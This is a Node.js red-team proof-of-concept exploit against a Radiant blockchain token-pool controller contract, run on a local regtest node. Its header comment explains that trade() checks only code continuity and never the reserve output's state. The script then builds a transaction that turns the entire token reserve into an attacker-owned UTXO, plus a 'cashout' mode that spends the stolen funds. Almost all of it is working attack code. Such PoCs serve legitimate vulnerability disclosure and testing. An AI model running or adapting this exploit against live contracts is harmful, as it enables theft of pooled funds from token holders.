#!/usr/bin/env node
/*
 * RED-TEAM PoC — RESERVE STATE HIJACK (critical, drains the entire token reserve).
 *
 * The controller's trade() enforces only CODE-ONLY continuity on the token-reserve
 * output (OP_CODESCRIPTBYTECODE_OUTPUT == ..._UTXO) and never inspects output[1]'s
 * STATE. Because every token UTXO shares one code (`OP_DROP <tokenAsm>`) regardless of
 * its state section, an attacker can recreate output[1] with the SAME code but with
 * THEIR OWN pkh as the state — turning the pool reserve into a holder UTXO they control,
 * while satisfying the constant-product invariant trivially (no-op trade: rxdOut==rxdIn,
 * tokOut==tokIn => K_out == K_in). The reserve is seized for the cost of a tx fee.
 *
 * Run order (uses the same genesis as the other harnesses):
 *   1. node genesis.cjs           -> broadcast + mine, write genesis_txid.txt
 *   2. node trade-attack-state-hijack.cjs   -> prints ATTACK_HEX; broadcast it -> ACCEPTED (BUG)
 *      (A correct controller MUST reject this. It currently does not.)
 *   3. node trade-attack-state-hijack.cjs cashout <ATTACK_TXID>  -> prints CASHOUT_HEX:
 *      attacker spends the stolen reserve via transfer() with their own key, no pool input.
 *
 * inputs : [0]=controller (OP_0 trade)  [1]=reserve (OP_1 release)  [2]=funding (fee)
 * outputs: [0]=controller' (R, faithful)  [1]=ATTACKER HOLDER (token code + attacker pkh, value T)
 *          [2]=RXD change
 */
const cp = require('child_process'), fs = require('fs');
const rsc = require('/Users/macbookair/CascadeProjects/RadiantScript/packages/cashscript/dist/main/index.js');
const r = require('/Users/macbookair/CascadeProjects/RadiantMM/node_modules/@radiant-core/radiantjs');
const { Transaction, Script, PrivateKey, Opcode, crypto } = r;
const BN = crypto.BN, Sighash = Transaction.Sighash;
const SIGHASH = crypto.Signature.SIGHASH_ALL | crypto.Signature.SIGHASH_FORKID;
const FLAGS = Script.Interpreter.SCRIPT_ENABLE_SIGHASH_FORKID | Script.Interpreter.SCRIPT_VERIFY_STRICTENC;
const RT = process.env.RMM_RT || '/tmp/rmm-regtest';
const rcli = (...a) => cp.execFileSync('/Users/macbookair/CascadeProjects/Radiant-Core/build/src/radiant-cli', [`-datadir=${RT}`, '-rpcwallet=rmm', ...a], { encoding: 'utf8' }).trim();
const toHex = (b) => Buffer.from(b).toString('hex');

const g = JSON.parse(fs.readFileSync(`${RT}/genesis.json`));
const tokenCode = Buffer.from(g.tokenCode, 'hex');
const mode = process.argv[2] || 'attack';

if (mode === 'cashout') {
  // Prove liquidity: spend the seized reserve (attack tx vout 1) via transfer() w/ attacker key.
  const a = JSON.parse(fs.readFileSync(`${RT}/attacker.json`));
  const atkTxid = process.argv[3];
  if (!atkTxid) throw new Error('usage: trade-attack-state-hijack.cjs cashout <ATTACK_TXID>');
  const priv = PrivateKey.fromWIF(a.wif), pub = priv.toPublicKey();
  const pkh = Buffer.from(crypto.Hash.sha256ripemd160(pub.toBuffer()));
  const stolenLock = Buffer.from(rsc.buildStatefulOutput(pkh, tokenCode));
  const dest = Buffer.from(rsc.buildStatefulOutput(pkh, tokenCode));
  const STOLEN_VAL = g.T_pool;
  const u = JSON.parse(rcli('listunspent', '1', '9999999')).filter(x => x.amount >= 1)[0];
  const fundPriv = PrivateKey.fromWIF(rcli('dumpprivkey', u.address)), fundSats = Math.round(u.amount * 1e8);
  const tx = new Transaction();
  tx.from({ txId: atkTxid, outputIndex: 1, script: toHex(stolenLock), satoshis: STOLEN_VAL });
  tx.from({ txId: u.txid, outputIndex: u.vout, script: u.scriptPubKey, satoshis: fundSats });
  tx.addOutput(new Transaction.Output({ script: Script.fromBuffer(dest), satoshis: STOLEN_VAL }));
  tx.to(rcli('getnewaddress'), fundSats - 5_000_000);
  const sig0 = Sighash.sign(tx, priv, SIGHASH, 0, Script.fromBuffer(stolenLock), new BN(STOLEN_VAL), FLAGS);
  const ss0 = new Script(); ss0.add(Buffer.from(pub.toBuffer())); ss0.add(Buffer.concat([sig0.toDER(), Buffer.from([SIGHASH])])); ss0.add(Opcode.OP_0);
  tx.inputs[0].setScript(ss0);
  const sig1 = Sighash.sign(tx, fundPriv, SIGHASH, 1, Script.fromHex(u.scriptPubKey), new BN(fundSats), FLAGS);
  const ss1 = new Script(); ss1.add(Buffer.concat([sig1.toDER(), Buffer.from([SIGHASH])])); ss1.add(Buffer.from(fundPriv.toPublicKey().toBuffer()));
  tx.inputs[1].setScript(ss1);
  process.stdout.write('CASHOUT_HEX:' + tx.serialize(true) + '\n');
  return;
}

const gtxid = fs.readFileSync(`${RT}/genesis_txid.txt`, 'utf8').trim();
const controllerLock = Buffer.from(g.controllerLock, 'hex');
const R = g.R, T = g.T_pool;

// Fresh attacker key, recorded so `cashout` can spend the seized reserve.
const priv = PrivateKey.fromRandom('regtest'), pub = priv.toPublicKey();
const pkh = Buffer.from(crypto.Hash.sha256ripemd160(pub.toBuffer()));
fs.writeFileSync(`${RT}/attacker.json`, JSON.stringify({ wif: priv.toWIF(), pkh: toHex(pkh) }));

// out1: SAME token code, state = attacker pkh (a holder), value = full reserve T.
const stolenReserveAsHolder = Buffer.from(rsc.buildStatefulOutput(pkh, tokenCode));

const u = JSON.parse(rcli('listunspent', '1', '9999999')).filter(x => x.amount >= 1)[0];
const fundPriv = PrivateKey.fromWIF(rcli('dumpprivkey', u.address)), fundSats = Math.round(u.amount * 1e8);

const tx = new Transaction();
tx.from({ txId: gtxid, outputIndex: 0, script: g.controllerLock, satoshis: R });
tx.from({ txId: gtxid, outputIndex: 1, script: g.reserveLock,    satoshis: T });
tx.from({ txId: u.txid, outputIndex: u.vout, script: u.scriptPubKey, satoshis: fundSats });
tx.addOutput(new Transaction.Output({ script: Script.fromBuffer(controllerLock),        satoshis: R }));  // rxdOut == rxdIn
tx.addOutput(new Transaction.Output({ script: Script.fromBuffer(stolenReserveAsHolder), satoshis: T }));  // SEIZURE
tx.to(rcli('getnewaddress'), fundSats - 5_000_000);
tx.inputs[0].setScript(Script.fromBuffer(Buffer.from([0x00]))); // trade
tx.inputs[1].setScript(Script.fromBuffer(Buffer.from([0x51]))); // release
const sig = Sighash.sign(tx, fundPriv, SIGHASH, 2, Script.fromHex(u.scriptPubKey), new BN(fundSats), FLAGS);
const ss = new Script(); ss.add(Buffer.concat([sig.toDER(), Buffer.from([SIGHASH])])); ss.add(Buffer.from(fundPriv.toPublicKey().toBuffer()));
tx.inputs[2].setScript(ss);

process.stdout.write(`K_in=${R*T} K_out=${R*T} (passes) marker=${g.marker} attackerPkh=${toHex(pkh)}\n`);
process.stdout.write('ATTACK_HEX:' + tx.serialize(true) + '\n');
